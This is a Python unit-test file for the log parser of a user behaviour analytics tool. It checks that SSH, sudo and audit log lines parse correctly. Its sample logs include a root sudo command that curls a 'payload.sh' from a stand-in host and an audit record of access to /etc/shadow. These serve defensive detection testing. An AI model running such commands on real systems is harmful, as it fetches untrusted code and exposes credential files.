import unittest

from argus_ueba.parsers import parse_line


class ParserTests(unittest.TestCase):
    def test_parse_ssh_success(self):
        event = parse_line("Jun  6 03:12:13 web01 sshd[501]: Accepted publickey for alice from 203.0.113.24 port 54001 ssh2", year=2026)

        self.assertIsNotNone(event)
        self.assertEqual(event.user, "alice")
        self.assertEqual(event.action, "ssh_login_success")
        self.assertEqual(event.source_ip, "203.0.113.24")

    def test_parse_sudo_command(self):
        event = parse_line("Jun  6 03:14:44 web01 sudo:    alice : TTY=pts/8 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://example/payload.sh", year=2026)

        self.assertIsNotNone(event)
        self.assertEqual(event.event_type, "process")
        self.assertEqual(event.command, "/usr/bin/curl http://example/payload.sh")

    def test_parse_audit_path(self):
        event = parse_line('type=PATH msg=audit(1780744680.123:520): item=0 name="/etc/shadow" acct="alice"')

        self.assertIsNotNone(event)
        self.assertEqual(event.event_type, "file")
        self.assertEqual(event.target, "/etc/shadow")
        self.assertEqual(event.user, "alice")


if __name__ == "__main__":
    unittest.main()
